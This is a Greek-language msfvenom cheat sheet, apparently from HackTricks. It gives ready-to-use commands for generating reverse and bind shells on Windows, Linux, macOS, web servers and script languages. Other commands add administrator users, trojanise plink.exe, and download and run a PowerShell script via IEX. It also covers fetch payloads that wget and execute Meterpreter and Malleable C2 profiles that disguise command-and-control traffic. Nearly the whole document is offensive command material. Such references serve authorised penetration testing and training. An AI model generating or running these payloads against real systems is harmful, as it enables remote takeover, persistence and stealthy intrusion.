# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## Βασικό msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Χρησιμοποιήστε το `-a` για να επιλέξετε την αρχιτεκτονική του payload και το `--platform` για να επιλέξετε την πλατφόρμα-στόχο του.<sup>[[1]](#references)</sup>

## Λίστα
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Αυτές οι εντολές παραθέτουν τα payload και encoder modules που είναι διαθέσιμα στο εγκατεστημένο framework.<sup>[[1]](#references)</sup>

## Συνήθη params κατά τη δημιουργία shellcode
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Οι flags που εμφανίζονται εδώ επιλέγουν bad characters, output format, encoder και iterations του encoding.<sup>[[1]](#references)</sup>

## Διαμόρφωση HTTP(S) traffic του Meterpreter

Το Metasploit 6.5 πρόσθεσε την option `MALLEABLEC2` σε staged και stageless reverse HTTP(S) Meterpreter payloads. Το profile μπορεί να αλλάξει τα URIs, τα user agents, τα request/response headers, την τοποθέτηση του connection-ID και τα υποστηριζόμενα body encodings/wrappers. Τόσο το generated payload όσο και ο handler του πρέπει να φορτώνουν το **ίδιο local profile**. Το αρχικό request ενός staged payload για το Meterpreter stage δεν διαμορφώνεται, επομένως προτιμήστε ένα stageless payload, όπως το `windows/x64/meterpreter_reverse_https`, όταν απαιτείται και το πρώτο request να ταιριάζει με το profile.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Ρυθμίστε τον αντίστοιχο handler με το ίδιο payload και profile:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Μόνο οι directives που τεκμηριώνονται ως implemented επηρεάζουν την traffic· τα unsupported profile blocks ενδέχεται να γίνονται parse επιτυχώς, ενώ δεν έχουν καμία επίδραση.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Δημιουργία Χρήστη
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Εκτέλεση Εντολής**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Το Encoding δεν είναι AV evasion:** encoders όπως το `x86/shikata_ga_nai` είναι κυρίως χρήσιμα για την ικανοποίηση περιορισμών bad-character. Το repeated encoding δεν αποτελεί αξιόπιστη τεχνική AV-evasion.<sup>[[1]](#references)</sup>

### Ενσωματωμένο μέσα σε executable
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Web Based Payloads**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloads σε Script Language**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Τα Fetch payloads παράγουν μια εντολή που κάνει ένα διαθέσιμο utility του target να κατεβάσει και να εκτελέσει ένα υποκείμενο native payload. Τα ονόματά τους ακολουθούν το `cmd/<platform>/<fetch-protocol>/<served-payload>`· είναι διαθέσιμα adapters για HTTP(S), SMB και TFTP, με τις επιλογές downloader να εξαρτώνται από την platform του target.<sup>[[2]](#references)</sup>

Για παράδειγμα, δημιουργήστε μια εντολή Linux `wget` που ανακτά ένα x64 Meterpreter payload από τη θύρα 8080 και πραγματοποιεί σύνδεση επιστροφής στη θύρα 4444:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Ξεκινήστε το **fetch handler** με τις ίδιες ρυθμίσεις· φιλοξενεί το παραγόμενο ELF και εκκινεί επίσης τον handler για το served Meterpreter payload:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Χρήσιμες εξαρτώμενες επιλογές περιλαμβάνουν τις `FETCH_PIPE=true`, για την έκδοση μιας συντομότερης εντολής HTTP(S) όπου υποστηρίζεται, και τις `FETCH_FILELESS=shell`, `shell-search` ή `python3.8+`, για την εκτέλεση ενός Linux ELF από έναν ανώνυμο file descriptor. Οι fileless λειτουργίες απαιτούν Linux kernel 3.17 ή νεότερο· εξετάστε τον ακριβή adapter με `msfvenom -p <FETCH_PAYLOAD> --list-options`, επειδή οι υποστηριζόμενοι συνδυασμοί διαφέρουν.<sup>[[2]](#references)</sup>



## References

- [1] [Πώς να χρησιμοποιήσετε το msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Πώς να χρησιμοποιήσετε τα Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
